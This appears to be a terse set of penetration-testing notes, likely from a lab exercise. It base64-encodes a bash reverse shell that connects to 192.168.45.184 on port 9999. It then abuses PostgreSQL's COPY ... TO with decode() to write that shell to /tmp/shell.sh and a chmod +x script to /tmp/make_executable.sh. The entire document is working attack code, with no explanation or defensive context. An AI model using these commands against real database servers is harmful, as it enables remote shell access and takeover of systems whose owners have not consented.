```

echo -n 'bash -i >& /dev/tcp/192.168.45.184/9999 0>&1' | base64


```

Create tmp/shell.sh
```
COPY (SELECT convert_from(decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4NC85OTk5IDA+JjE=
', 'base64'), 'utf-8')) TO '/tmp/shell.sh';

```
create a /tmp/make_executable.sh 


```
COPY (SELECT convert_from(decode('Y2htb2QgK3ggL3RtcC9zaGVsbC5zaA==', 'base64'), 'utf-8')) TO '/tmp/make_executable.sh';



```
